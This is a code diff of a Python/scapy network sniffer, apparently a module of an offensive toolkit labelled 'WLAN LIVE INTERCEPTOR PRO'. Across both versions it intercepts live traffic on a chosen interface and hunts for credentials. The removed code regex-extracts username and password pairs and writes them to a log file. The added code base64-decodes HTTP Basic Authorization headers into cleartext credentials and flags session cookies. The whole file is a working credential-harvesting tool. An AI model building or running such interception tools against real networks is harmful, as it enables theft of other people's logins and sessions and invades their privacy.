@@ -1,162 +1,101 @@
 import re
 import os
+import base64
 from datetime import datetime
 from scapy.all import sniff, IP, TCP, UDP, conf, Raw
 from rich.console import Console
 from rich.table import Table
 from rich.live import Live
-from rich.panel import Panel
 from core.ui import draw_header
 
 console = Console()
-
-# --- Configuration & State ---
-SENSITIVE_KEYWORDS = [b"password", b"user",
-                      b"pass", b"login", b"pwd", b"auth", b"key"]
-captured_data = []  # Stores high-value targets for the live table
-log_file = f"logs/interception_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+captured_intel = []
 
 
-def extract_credentials(payload):
-    """Attempts to find plaintext credentials in raw payloads."""
-    decoded_payload = payload.decode('utf-8', errors='ignore')
-    found = []
-    # Simple regex for key=value patterns common in forms
-    patterns = [
-        r"(?i)(user|username|login|email|pass|password|pwd)=(.[^&^ ]*)"
-    ]
-    for pattern in patterns:
-        matches = re.findall(pattern, decoded_payload)
-        for m in matches:
-            found.append(f"{m[0]}:{m[1]}")
-    return found
+def parse_http_intel(load):
+    """Deep inspection of HTTP traffic for secrets and tech-stack info."""
+    decoded = load.decode('utf-8', errors='ignore')
+    intel = []
+
+    # Check for Authorization headers
+    auth_match = re.search(r"Authorization: Basic (.*)", decoded)
+    if auth_match:
+        try:
+            creds = base64.b64decode(auth_match.group(1)).decode()
+            intel.append(f"[BOLD RED]BASIC AUTH: {creds}[/BOLD RED]")
+        except:
+            pass
+
+    # Detect Cookies and User-Agents
+    if "Cookie:" in decoded:
+        intel.append("[yellow]Session Cookie Found[/yellow]")
+    if "User-Agent:" in decoded:
+        ua = re.search(r"User-Agent: (.*)", decoded)
+        if ua:
+            intel.append(f"[dim]UA: {ua.group(1)[:30]}...[/dim]")
+
+    return intel
 
 
 def packet_callback(packet):
-    """Deep Packet Inspection Logic"""
-    if not packet.haslayer(IP):
+    if not packet.haslayer(IP) or not packet.haslayer(TCP):
         return
 
-    src = packet[IP].src
-    dst = packet[IP].dst
-    proto_tag = "[dim][UDP][/dim]"
-    info = ""
-    is_high_value = False
+    src, dst = packet[IP].src, packet[IP].dst
+    port = packet[TCP].dport
+    info = []
 
-    if packet.haslayer(TCP):
-        port = packet[TCP].dport
-        proto_tag = "[bold cyan][TCP][/bold cyan]"
+    if packet.haslayer(Raw):
+        load = packet[Raw].load
+        # Hunt for plain-text patterns
+        if any(kw in load.lower() for kw in [b"user", b"pass", b"login"]):
+            info.append(
+                "[bold red]Potential Credentials In Payload[/bold red]")
 
-        # Protocol Identification
-        if port == 80:
-            proto_tag = "[bold green][HTTP][/bold green]"
-        elif port == 21:
-            proto_tag = "[bold red][FTP][/bold red]"
-            is_high_value = True
-        elif port == 23:
-            proto_tag = "[bold bright_red][TELNET][/bold bright_red]"
-            is_high_value = True
-        elif port == 445:
-            proto_tag = "[bold yellow][SMB][/bold yellow]"
-        elif port in [110, 143]:
-            proto_tag = "[bold magenta][MAIL][/bold magenta]"
-            is_high_value = True
+        # HTTP specific intel
+        if port in [80, 8080]:
+            info.extend(parse_http_intel(load))
 
-        # Payload Inspection
-        if packet.haslayer(Raw):
-            load = packet[Raw].load
-
-            # 1. Search for Credentials
-            creds = extract_credentials(load)
-            if creds:
-                info = f"[bold red]CREDENTIALS FOUND: {', '.join(creds)}[/bold red]"
-                is_high_value = True
-
-            # 2. Check for sensitive keywords in unknown TCP streams
-            elif any(key in load.lower() for key in SENSITIVE_KEYWORDS):
-                info = f"[yellow]Sensitive Data Detected: {load[:50]}...[/yellow]"
-                is_high_value = True
-
-        # Output to main log
-        msg = f"{proto_tag} [white]{src}[/white] -> [magenta]{dst}:{port}[/magenta] {info}"
-        console.print(msg)
-
-        # Update high-value capture list
-        if is_high_value:
-            timestamp = datetime.now().strftime("%H:%M:%S")
-            captured_data.append(
-                {"time": timestamp, "src": src, "dst": dst, "info": info})
-            with open(log_file, "a") as f:
-                f.write(f"[{timestamp}] {src} -> {dst} | {info}\n")
-
-    elif packet.haslayer(UDP):
-        port = packet[UDP].dport
-        if port == 53:
-            proto_tag = "[bold blue][DNS][/bold blue]"
-            # Could add DNS Query sniffing here
-        console.print(
-            f"{proto_tag} [dim]{src}[/dim] -> [dim]{dst}:{port}[/dim]")
+    if info:
+        timestamp = datetime.now().strftime("%H:%M:%S")
+        captured_intel.append({
+            "time": timestamp, "src": src, "dst": f"{dst}:{port}", "intel": " | ".join(info)
+        })
 
 
-def generate_live_table():
-    """Creates the 'High-Value Targets' dashboard."""
-    table = Table(title="Captured High-Value Traffic",
-                  expand=True, border_style="red")
-    table.add_column("Time", style="cyan", no_wrap=True)
+def generate_intel_table():
+    table = Table(title="Live Intelligence Stream",
+                  expand=True, border_style="cyan")
+    table.add_column("Time", style="dim")
     table.add_column("Source", style="green")
     table.add_column("Target", style="magenta")
-    table.add_column("Intel/Payload", style="white")
+    table.add_column("Intercepted Intel", style="white")
 
-    # Only show the last 10 interceptions in the table
-    for entry in captured_data[-10:]:
-        table.add_row(entry["time"], entry["src"], entry["dst"], entry["info"])
-
+    for entry in captured_intel[-10:]:
+        table.add_row(entry["time"], entry["src"],
+                      entry["dst"], entry["intel"])
     return table
 
 
 def start_sniffing():
-    # Ensure logs directory exists
-    if not os.path.exists("logs"):
-        os.makedirs("logs")
-
     draw_header("WLAN LIVE INTERCEPTOR PRO")
-
-    # 1. Interface Discovery
-    try:
-        ifaces = [i.name for i in conf.ifaces.data.values()]
-    except:
-        console.print(
-            "[bold red][!] Error:[/bold red] Could not retrieve interfaces. Run as root?")
-        return
-
-    console.print(Panel(
-        f"Available: {', '.join(ifaces)}", title="Interfaces", border_style="blue"))
-    chosen_iface = console.input(
-        "[bold yellow]Select Interface (e.g., eth0, wlan0): [/bold yellow]").strip()
-
-    if not chosen_iface:
-        return
-
-    console.print(f"\n[bold green][*] Session Log: {log_file}[/bold green]")
+    ifaces = [i.name for i in conf.ifaces.data.values()]
     console.print(
-        f"[bold green][*] Monitoring {chosen_iface}... (CTRL+C to Stop)[/bold green]\n")
+        f"[blue][*] Available Interfaces: {', '.join(ifaces)}[/blue]")
+    iface = console.input(
+        "[bold yellow]Select Interface: [/bold yellow]").strip()
+
+    if not iface:
+        return
 
     try:
-        # The Live context allows the table to update at the top while packets scroll below
-        with Live(generate_live_table(), refresh_per_second=1) as live:
-            def wrapped_callback(packet):
-                packet_callback(packet)
-                live.update(generate_live_table())
+        with Live(generate_intel_table(), refresh_per_second=1) as live:
+            def wrapped_cb(pkt):
+                packet_callback(pkt)
+                live.update(generate_intel_table())
 
-            sniff(iface=chosen_iface, prn=wrapped_callback, store=False)
-
-    except PermissionError:
-        console.print(
-            "[bold red][!] Permission Denied: Please run Davoid with 'sudo'.[/bold red]")
+            sniff(iface=iface, prn=wrapped_cb, store=False, filter="tcp")
     except KeyboardInterrupt:
-        console.print(
-            "\n[bold yellow][!] Interception halted. Logs saved.[/bold yellow]")
+        console.print("\n[yellow][!] Sniffing Halted.[/yellow]")
     except Exception as e:
-        console.print(f"[bold red][!] Error:[/bold red] {e}")
-
-    input("\nPress Enter to return to Main Menu...")
+        console.print(f"[red]Error: {e}[/red]")
